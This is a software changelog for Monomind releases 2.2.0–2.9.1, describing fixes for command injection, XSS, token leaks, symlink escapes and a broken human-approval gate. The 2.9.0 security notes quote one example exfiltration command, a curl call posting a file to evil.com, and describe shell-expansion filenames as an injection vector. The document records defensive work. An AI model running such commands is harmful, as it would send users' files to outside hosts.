# Changelog

All notable changes to Monomind (`monomind` umbrella + `@monoes/monomindcli`).

## [2.9.1] — 2026-08-09

### Critical + quick-win fixes from a 28-agent full-codebase audit

Driven by a 28-agent parallel audit spanning every package (166 raw findings, deduped to 30 defects + 8 value opportunities + 12 quick wins). This release closes the 5 findings scored critical and 9 of the 12 quick wins (3 more were folded into the critical fixes below, since they targeted the same lines).

**Test results:** cli package — CI had never once passed (see below), so there is no prior baseline; first clean run is **1721 passed / 1 skipped / 0 failed** (+26 new regression tests this release). hooks package: 58/58. monodesign package: 1029 tests, 1020 passed / 9 skipped / 0 failed (+2 new). monograph: unaffected, 34/34 impact-suite tests still pass.

#### 🔒 Security

- **CI had never actually passed** — `packages/@monomind/cli/tsconfig.json`'s project references omitted its own `@monoes/monograph` workspace dependency, so `tsc` failed with ~70 `TS2307` errors before any test executed. Confirmed via `gh run list`: 29 of the last 30 workflow runs failed at this exact step. Every fix merged since the workflow's creation — including every other fix in this release — shipped with zero automated regression coverage until now. Fixed by adding the missing project reference.
- **Org runtime's human-approval gate never fired on any real path.** `canUseTool` (the SDK's actual per-tool-call gate) delegated entirely to `PolicyEngine.decide()`, which has no concept of "pause for a human" — the approval hook (`checkApproval`/`beforeTool`) was only ever invoked from the `org_send` tool's own handler, hardcoded to check the literal action name `'org_send'` (not in the sensitive-actions list, so always a no-op). Bash/WebFetch/WebSearch/`org_complete` never consulted the gate at all. Separately, `org approve`/`org deny` compared the CLI's raw action argument against the stored record's `question` field (a full sentence) instead of its `action` field (the raw name), so a real invocation like `org approve myorg boss Bash` could never match a pending entry. Fixed: `canUseTool` now composes policy's static checks with the approval gate (extracted as `gatedCanUseTool`, exported for testability); `org approve`/`org deny` compare the correct field and gained a live-daemon HTTP path (`/api/set-approval`, mirroring `gate-approve`/`answer`) instead of only ever writing `approvals.json` offline. 15 new regression tests.
- **`detect-secrets` MCP tool leaked the raw secret it just found.** Every finding's `context` field was the full, unescaped source line sitting next to the deliberately masked value — handing back exactly what masking exists to hide. `targetPath` also had no path validation, so a caller (or an agent following injected instructions) could point it at `~/.aws` or any other readable path. Fixed: `context` is now redacted the same way `masked` is built, and `targetPath` is validated via the shared `utils/input-guards.ts` entry point. 4 new tests.
- **Unauthenticated dashboard endpoint relayed arbitrary attacker JSON into unescaped `innerHTML`.** `POST /api/mastermind/event` on the monobrowse workflow dashboard (`browser/dashboard/server.ts`) only checked that the body parsed as JSON, then broadcast it verbatim to every connected WebSocket client; `ui.html` wrote several fields unescaped into `innerHTML`, including one spliced into a single-quoted JS string inside an inline `onclick` handler (a JS-string breakout, not just HTML injection). Fixed: the endpoint now validates the body against the real `StepEvent` schema and rejects cross-origin `Origin` headers before broadcasting; `ui.html` escapes every field and the stop button uses a `data-run-id` attribute + a delegated listener instead of building `onclick="stopRun('...')"` from attacker-controlled text. 7 new tests.
- **monodesign's live-preview server handed out its own auth token via an unauthenticated route.** `/live.js` had no bearer-token check (every other route already had one) and its response embedded the token verbatim — requesting that one route defeated every other route's gate. `/source?path=` also had a lexical-only (no `fs.realpathSync`) containment check, the same symlink-escape class already fixed correctly elsewhere in the same package. Fixed: `/live.js` now requires the token (threaded through `live-inject.mjs` and the SvelteKit adapter, which construct the injected `<script src>` tag), and `/source` resolves symlinks on both sides before comparing. 4 new/updated tests.
- **Two dashboard files rendered attacker-influenceable strings unescaped into HTML.** `dashboard.html`'s org-role avatar renderer spliced `role.avatar` into `href`/`src` attributes with no escaping at 3 call sites; `orgs.html`'s artifact "View" button built `onclick="viewArtifact(${JSON.stringify(art.path)},...)"` — `JSON.stringify` escapes for a JS-string context, not an HTML-attribute context, so a literal quote in the path broke out of the attribute. Fixed: avatars go through the existing `esc()` helper; the artifact button uses `data-path`/`data-label` attributes + a direct listener instead of building `onclick` from a JSON-stringified path.
- **A bypassable symlink path-containment pattern recurred in the cache-eviction worker.** `worker-cache.ts` used the lexical-only `safePath()` to validate `.monomind/cache`/`.monomind/temp` before a *recursive delete* — if either were a symlink pointing outside the project root, `fs.rm(..., {recursive:true})` would follow it. Fixed: switched to the already-correct, already-existing `safePathAsync()` (realpaths both sides before comparing). 1 new test proving files outside the project root survive.

#### 🧱 Robustness

- **Memory-bridge backend eviction called a nonexistent method, leaking a SQLite connection per eviction.** The LRU-style eviction path called `.close?.()`; neither backend class exposes `close()`, only `shutdown()` (the method `shutdownBridge()` already used correctly two functions away). Because the call used optional chaining, the nonexistent-method call silently resolved to `undefined` — every 6th distinct database path opened in one process leaked the oldest slot's connection for the process lifetime. One-line fix.

#### 🚀 Performance

- **`impact.ts` had its own unbatched `getNodesByIds`**, building one `WHERE id IN (...)` query per call regardless of size — a wide-fan-in node's caller list could exceed SQLite's variable-count limit and crash the query. `storage/node-store.ts` already exports a correctly-batched version (50 IDs per query). Deduped: `impact.ts` now imports the shared implementation instead of shadowing it with its own.

#### 📦 Packaging & repo hygiene

- **`@monoes/monograph` shipped with no `files` allowlist** — 2181 files / 5.5MB including raw source and test directories on every install. Added `"files": ["dist", "README.md"]`, matching every sibling package's convention. Unpacked size: 5.5MB → 3.4MB.
- **`nanoid` had no override pinning it past a known-vulnerable resolved version** (3.3.16) — the one gap in an otherwise 25-entry `pnpm.overrides` list. Added `"nanoid": ">=3.3.17"` to both `overrides` and `pnpm.overrides`; resolves to `6.0.1`.
- **`.gitignore`'s bare `monomind` pattern (two occurrences) matched any path component named exactly "monomind," anywhere in the tree** — not just the intended root-level scratch directory. It was silently excluding `packages/@monomind/cli/.claude/skills/monomind/` (a real, already-tracked skill directory) from ever being re-added if removed. Anchored both to `/monomind`.
- **10 stale, month-old `.monograph/cache/churn-*.json` files were still tracked in git** — committed 2026-07-09, three days before a directory-level `.monograph/` gitignore rule was added on 2026-07-12, which (correctly) never retroactively untracked already-committed files. Removed from tracking with `git rm --cached`; the files themselves are untouched on disk.

#### 📝 Docs

- **README's Trust & Security table claimed the license is MIT** — contradicted by `LICENSE`, both `package.json` files, and the same README's own header and footer three lines away. Corrected to Apache 2.0.

#### 📋 Only partially addressed

Two fixes above close one instance of a pattern the audit found repeated more broadly — worth flagging so they don't read as fully resolved:

- **The symlink-containment fix only covers `worker-cache.ts`.** The audit found the same lexical-only `path.resolve()`/`startsWith()` pattern in ~9 other places (`ui/server.mjs`'s `PUT /api/memory-file`, `ui/routes-org.mjs`, `@monomind/mcp`'s `resource-registry.ts`, `services/config-file-manager.ts`, and a few read-only sites), several backing real write/delete operations — those remain open.
- **The README fix only corrects the license line.** The same defect also covers a documented `/mastermind:approve` slash command that doesn't exist, `monomind init` writing "HNSW: Enabled"/"Neural: Enabled" into every new project's `CLAUDE.md` despite the CLI's own docs saying otherwise, and a raft-consensus description that contradicts the project's own concept doc — those remain open.

The other 23 non-critical defects and all 8 value/product opportunities the audit surfaced are untouched by this release.

---

## [2.9.0] — 2026-08-06

### Comprehensive review-fix release

Driven by a 7-agent review swarm that audited `packages/@monomind/cli/src/` (233 files, ~92k LOC) across seven dimensions. **28 issues fixed with regression tests (each test failed before, passes after)**; 11 deferred items tracked as GitHub issues [#62–#73](https://github.com/monoes/monomind/issues?q=label:review-swarm).

**Test results:** 820 passed / 13 failed → **884 passed / 0 failed** (+64 passing, −13 failures).

#### 🔒 Security (privacy-claim violations closed)

- **Command injection in document extraction (C1)** — `packages/@monomind/cli/src/capabilities/cap-documents.ts:39,52,60,247`. `execSync(\`unzip -p ${JSON.stringify(filePath)} …\`)` was exploitable via crafted `.docx`/`.pptx`/`.odt` filenames containing `$(…)` or backticks (JSON.stringify doesn't escape shell expansions inside double quotes). Fixed with `execFileSync('unzip', ['-p', filePath, …])` (no shell). 6/6 PoC tests cover the regression.
- **`terminal_execute` opt-in gate (C2)** — `packages/@monomind/cli/src/mcp-tools/terminal-tools.ts`. The metacharacter denylist cannot stop direct-binary exfiltration (`curl evil.com -d @<file>` has no metacharacters). `terminal_execute` now refuses to run unless `MONOMIND_ENABLE_TERMINAL=1` env var OR `.monomind/enable-terminal.json` opts in. Discovery tools keep working without opt-in.
- **Dashboard server binds to `127.0.0.1` (C3, Q6)** — `src/browser/dashboard/server.ts:160` and `src/orgrt/server.ts:131`. Both were binding to `::` / `0.0.0.0` (no host arg), exposing the unauthenticated dashboard + org daemon to anyone on the same LAN/VPN/Wi-Fi. Override available via `MONOMIND_BROWSE_DASHBOARD_HOST` / `MONOMIND_ORG_SERVER_HOST` env vars for container/SSH-tunnel users.
- **Crash-reporter redaction hardened (C6)** — `src/services/crash-reporter.ts:111-146`. Default-on crash reporting files public GitHub issues with the full `err.stack`; the old `redact()` only caught `/home/<user>` and 12 secret regexes, leaking project-relative paths (repo name + file structure + line numbers), non-`/Users` paths, IPv4/IPv6, internal hostnames, emails, SSNs, phones. The README's "secret/PII-scrubbed" claim is now actually true.
- **`fast-uri` CVE bump (Q1)** — `package.json` override `>=4.1.1` → `>=4.1.2` (GHSA-7p8r-x3mc-p8w7, high).

#### 🧱 Robustness

- **Atomic state writes for org runtime (C4)** — `src/orgrt/daemon.ts` (5 sites). `runtime.json`, `approvals.json`, branch `bus.jsonl`, heartbeat. Direct `writeFileSync(<final-path>, …)` could brick every `org status` / `isOrgRunning` / scheduler call on Ctrl-C during `org stop`. All 5 sites now use `writeJsonFileAtomic()` (tmp + rename).
- **`memory-bridge.ts` surfaces errors instead of swallowing (R1)** — 8 catch sites. SQLITE_BUSY, EACCES, disk-full no longer collapse to "no matches"; logged via new `logBridgeError(label, err)` helper (DEBUG/MONOMIND_DEBUG-gated).
- **`sql.js`-missing fallback no longer fakes a SQLite file (R2)** — `src/memory/memory-initializer.ts:352-405`. Old code wrote a 4 KB "SQLite format 3" header to disk and reported `success:true`; every subsequent read failed and `checkMemoryInitialization` looped forever. Now returns `success:false` with a clear install hint.
- **`busy_timeout:5000` for concurrent SQLite access (R3)** — added to the `@monoes/memory` config. Concurrent MCP server + CLI hook hitting the same `memory.db` no longer silently lose writes to SQLITE_BUSY.
- **Git worktree `execSync` calls carry `timeout:30000` (R4)** — 7 sites in `daemon.ts`. A wedged git hook (git-lfs, gc lock, gpg sign prompt) could previously hang the whole daemon forever.
- **`checkApproval`/`setApproval` serialized per-org (R5)** — Promise-chain mutex fixes the TOCTOU race on `this.approvals` + `approvals.json`.
- **`OrgCheckpoint` schema gains a `version` field (R6)** — `validateCheckpoint` now detects shape changes explicitly instead of silently failing the checksum.
- **`OrgBus.emit` surfaces durable-log append failures (R7)** — emits a follow-up audit event so lost events are attributable in run history instead of DEBUG-only swallow.
- **Latent checkpoint checksum bug fixed** — `generateChecksum` was using `JSON.stringify(state, Object.keys(state).sort())`. Passing an array as the second arg makes it a *whitelist* applied at EVERY nesting level; nested fields like `roleState.boss.tokensUsed` were silently stripped from the canonical form. **`validateCheckpoint` provided ZERO integrity guarantee since the feature shipped.** Fixed with recursive `stableNormalize` + SHA-256 (truncated to 64 bits).
- **Pre-existing ESM hygiene test failure fixed (Q7)** — `daemon.ts:423` had a bare `require('node:child_process')` that vitest's CJS shim masked but the built package threw "require is not defined" in real Node ESM execution.

#### 🚀 Performance

- **Monograph staleness cached per-repo for 30s (P2)** — `src/mcp-tools/monograph-tools.ts`. Cuts a 50–100ms `git rev-list --count` spawn from every `monograph_query` / `_suggest` / `_staleness` / `_health` call.
- **PPR rerank N+1 batched into `WHERE id IN (?, ?, …)` (P3)** — was ~50 round-trips per call, now 2.

#### 📋 Test coverage for previously-untested critical paths

- **`OrgCheckpoint` round-trip (T3, 9 tests)** — capture → validate → tamper → reject for roleState, pendingRoles, version field, TTL expiry, JSON round-trip.
- **`memory-tools` input validation (T1, 11 tests)** — `pattern-search` rejects empty/NUL/ANSI/oversized queries; `pattern-store` rejects empty/NUL keys and NUL values; `feedback` clamps score to [0,1]; `sanitizeError` strips filesystem paths from returned messages.

#### 🏗 Architecture

- **`mcp-tools/types.ts` path helpers extracted to `utils/paths.ts` (A1)** — `getProjectCwd` / `getMonomindDataRoot` / `migrateLegacyStoreFile` moved. Dependency direction is now correct: tool layer consumes path infra, not the reverse.
- **Circular dep broken between `mcp-client.ts` and `monomind-tools.ts` (A2)** — `monomind-tools.ts` now does a dynamic `import()` inside the handler instead of a static cycle.
- **4 orphan workspace packages deleted (A6)** — `@monomind/graph`, `@monomind/security`, `@monoes/monoplaybook`, `plugins/agentic-qe` (only stale build artifacts, no source).

#### ✨ New features & DX

- **`monomind init` emits a runnable sample org (C5)** — new `src/init/write-sample-org.ts`. Every successful `monomind init` writes a schema-valid `.monomind/orgs/sample-team.json` derived from the existing `content-team` template. The README's headline-feature onboarding was previously pointing at a file that didn't exist. Idempotent — never overwrites user edits.
- **Graph staleness surfaced in statusline (V4)** — `src/init/statusline-generator.ts`. Silent staleness was the most dangerous failure mode. Statusline now shows `⊛ <nodes>n <N>behind` with color escalating (green ≤3, gold ≤10, coral >10).
- **Global Documents dashboard section with markdown viewer** — new `📄 Documents` tab under the Global section. Surfaces mastermind-generated markdown across all known projects + the global brain, ordered by date, with a high-fidelity markdown renderer (headings with anchors, bold/italic/strikethrough, inline + fenced code with language label + copy button, unordered/ordered/nested/task lists, GFM tables with per-column alignment, nested blockquotes, horizontal rules, images, links with `rel=noopener`, YAML frontmatter stripping, HTML-escaped at boundary with `<script>`/`on*` handler stripping). Backend: `GET /api/global-docs` + `GET /api/global-doc/read?path=…` with path-traversal protection (403) and `.md`-only enforcement (400).
- **Dead-code cleanup** — deleted `transfer/types.ts` + `transfer/exports/` + dead `anonymization` exports (~740 LOC). Removed `eval-row6-*.json` from repo root and gitignored.
- **Pre-existing test failures fixed** — root-owned `.tmp-audit-test/` directory (leftover from a `sudo` run) was causing all 12 `tests/hive-mind/consensus.test.mjs` AuditWriter tests to fail with EACCES. Removed and gitignored.

#### ⚠️ Behavior changes (with escape hatches)

These changes are technically breaking for users who depended on the old behavior; each has a documented override.

- **`terminal_execute` now requires opt-in.** Set `MONOMIND_ENABLE_TERMINAL=1` or write `.monomind/enable-terminal.json` with `{"enabled":true}` to restore the old default-on behavior.
- **Dashboard + org servers bind to `127.0.0.1` only.** Set `MONOMIND_BROWSE_DASHBOARD_HOST=<host>` or `MONOMIND_ORG_SERVER_HOST=<host>` to bind a specific interface.
- **Crash-reporter redaction is stricter.** Stack traces now show basenames only (no project paths), and IPs/emails/hostnames/SSNs/phones are scrubbed. If you've been debugging crash-reporter output, you'll see less context.
- **`sql.js`-only fallback now fails honestly** instead of silently producing a non-functional DB. Install `sql.js` or `@monoes/memory` to re-enable.

#### 📝 Tracking follow-ups

11 items deferred with explicit rationale, each filed as a GitHub issue labeled [`review-swarm`](https://github.com/monoes/monomind/issues?q=label:review-swarm):

- #62 Delete `production/` dead-code package (v3.0.0 breaking change)
- #63 Curate unrouted agents in `.claude/agents/generated/`
- #64 Split god files (`init/executor.ts`, `monograph-tools.ts`, `OrgDaemon`)
- #65 Consolidate duplicated input-guard helpers
- #66 Add FTS5 to `memory_search` (biggest perf win, cross-package)
- #67 Bound dashboard maps with LRU eviction
- #68 Crash-reporter concurrency tests
- #69 Auto-update `executor`/`validator` tests (security boundary)
- #70 Wire up the dead LSP server + VS Code extension
- #71 Memory browser tab in dashboard
- #72 Real incremental graph updates (multi-day, biggest payoff)

Epic tracking all 11: **[#73](https://github.com/monoes/monomind/issues/73)**.

Full report: `docs/mastermind/reviews/2026-08-05-comprehensive-review-fixes.md`.

---

## [2.8.0] — 2026-07-31

### Antigravity (agy) Support

Monomind now officially supports **Google Antigravity (agy)** alongside Claude Code.

#### What's new

- **`monomind init` generates Antigravity files** — every init run now also creates:
  - `GEMINI.md` — agent instructions and MCP tool rules read by agy
  - `.gemini/rules/monomind.md` — workflow rules file (when to call monograph, memory, knowledge_search)
  - `.gemini/helpers/statusline.sh` — shell wrapper that drives the agy status bar
  - `.gemini/helpers/statusline.cjs` + `utils/` — full Node.js statusline engine (same as Claude Code)
  - `.gemini/settings.json` — wires `statusLine.command` so the status bar appears automatically

- **Status bar in agy** — the Monomind status bar (graph node count, stale nodes, agent routing, git state, session cost) now appears at the bottom of the agy chat window, exactly as it does in Claude Code's terminal UI. No manual setup required after `monomind init`.

- **Global agy settings auto-wired** — `monomind init` also updates `~/.gemini/antigravity-cli/settings.json` and writes `~/.gemini/antigravity-cli/statusline.sh` so the status bar works even before project-level init has run.

- **Org Runtime — multi-LLM providers** — `monomind org run` now supports `gemini` and `openai` provider kinds in org JSON files:
  ```json
  { "provider": { "kind": "gemini", "apiKeyEnv": "GEMINI_API_KEY" } }
  ```
  Org role sessions resolve `GEMINI_API_KEY` / `OPENAI_API_KEY` from the environment without embedding secrets.

- **`isDevRepo` sentinel relaxed** — the `[STALE_HELPERS]` check in `session-restore-handler.cjs` now correctly suppresses auto-heal when running inside the monomind dev repository (only `packages/@monomind/cli/package.json` presence required; no longer also requires the bundled `.claude/helpers` subtree).

## [2.5.0] — 2026-07-18


### Orgs can read your Second Brain
- Org agents get a `knowledge_search` tool: merged semantic search over the project's documents **and** your personal global brain, with the same project-first ranking as every other surface. Role briefings instruct agents to ground work in your actual documents; every lookup is a bus event visible in `org logs` / `org report`.

### Live document ingestion
- The dashboard server (long-lived, warm embedding model) watches the project and ingests changed `md/txt/pdf/docx` in-process within ~5 seconds of a save — no session restart needed. Platforms without recursive watch fall back silently to the session-start reindex.

### Global-brain polish
- Dashboard Second Brain search: project/global/all scope selector, `global` badges, real source-file labels.
- README + the generated per-project CLAUDE.md now teach the cross-project brain (auto-routing, `--store`, `--global`, OKF portability).

## [2.4.0] — 2026-07-18

### Global Second Brain (cross-project)
- One personal knowledge store at `~/.monomind/global-brain` (relocatable via `MONOMIND_GLOBAL_BRAIN_DIR`), structurally exempt from `cleanup --data`.
- **Zero-decision routing:** `doc ingest` on a path outside the current project auto-routes to the global brain (announced, overridable); `--global` forces it; `doc list/export --global`.
- **Merged retrieval everywhere:** `doc search`, the warm `/api/knowledge/search` endpoint, and per-prompt `[SECOND_BRAIN]` injection query project + global; project results win ties, global hits are labeled.
- Memory bridge refactored from a first-caller-wins singleton to a per-store instance cache (also fixes a latent store-misroute); excerpt provenance rides the `src:` ingest tag end-to-end.

## [2.3.x] — 2026-07-18

### 2.3.4 — Swarm-review hardening (round 2)
- Chunker: code-fence awareness (`#` lines in ``` blocks are never headings), CRLF normalization, backward-scan loop guards. (`@monoes/memory@1.0.8`)
- Memory engine: `UNIQUE(namespace,key)` enforced in better-sqlite3 (existing DBs deduped newest-wins), TTL-expired entries excluded from search, streaming row iteration.
- Org runtime: unified boss-selection for `org_complete` gating; `org answer` merges by question id instead of clobbering; `org logs` skips corrupt interior lines; `--run` flag validated; doc-metadata removal via append-only tombstones with compaction.
- Every failed CLI command now prints its failure reason (dispatcher-level fix).

Also in the 2.3.4 cycle: a 49-agent adversarial review of the week's modules confirmed 33 findings — **all 33 fixed**, including a critical `cleanup --data` rule that would have deleted live memory stores, and a silent org message-loss window during session restarts. Ledger: `docs/mastermind/plans/2026-07-18-swarm-review-findings.md`.

### 2.3.3 — Semantic per-prompt knowledge injection
- The dashboard server holds the local embedding model warm and serves `/api/knowledge/search` in ~60ms; every substantive Claude Code prompt gets its top knowledge excerpts injected automatically (`[SECOND_BRAIN]`), with tokenized keyword fallback and visible `(semantic)`/`(keyword)` provenance. Injection telemetry (never prompt text) in `.monomind/metrics/second-brain.jsonl`.

### 2.3.2 — Second Brain foundations
- Heading-aware chunking with `§ section` context prefixes; session-start reindex of changed documents; retrieval golden-set eval grown to 18 cases (80% paraphrase recall bar).
- Org cross-run memory: run outcomes stored per `memory_namespace`, `org_recall` tool for agents.
- `cleanup --data`: provable pruning of orphaned per-project stores via origin markers.
- Doctor: Second Brain model check.

### 2.3.1 — Memory engine replaced (LanceDB removed)
- The memory/Second Brain engine is now local SQLite (better-sqlite3, sql.js WASM fallback) storing text + embedding vectors, with local MiniLM embeddings — **~600MB of native dependencies removed** (`@lancedb/lancedb`, `apache-arrow`, onnx runtime stays for embeddings). (`@monoes/memory@1.0.6`)
- Fixed: semantic search over the native backend returned nothing (empty stub); keyword search required whole-phrase matches; namespace filters leaked across namespaces.
- Retrieval quality became a tested invariant: paraphrase golden-set eval in CI.

### 2.3.0 — Org Runtime v2 capability wave
- **Observability:** `org logs --follow` (live event tail), `org report` (outcome, per-role tokens vs budget, assets, crashes; `--all` for run history).
- **Outcomes + memory:** coordinator records run outcomes via `org_complete`; next run is briefed on the last; history in `<org>/history.jsonl`.
- **Headless HIL:** `org questions` / `org answer` — answer `ask_human` from the terminal, live or queued.
- **Resilience:** crashed agent sessions restart with backoff; crash detection in `org status`.
- **DX:** `org run --dry-run` (role-briefing preview), `org create --template content-team|dev-team|research-pod`, `org validate` (schema + structural invariants), informative `org list`, running-org guards on `stop`/`delete`.

## [2.2.0] — 2026-07-17 and earlier

- Org Runtime v2 (SDK daemon) baseline: per-role live agent sessions, `org_send` message bus, policy-gated tools, dashboard event forwarding, cross-process org discovery.
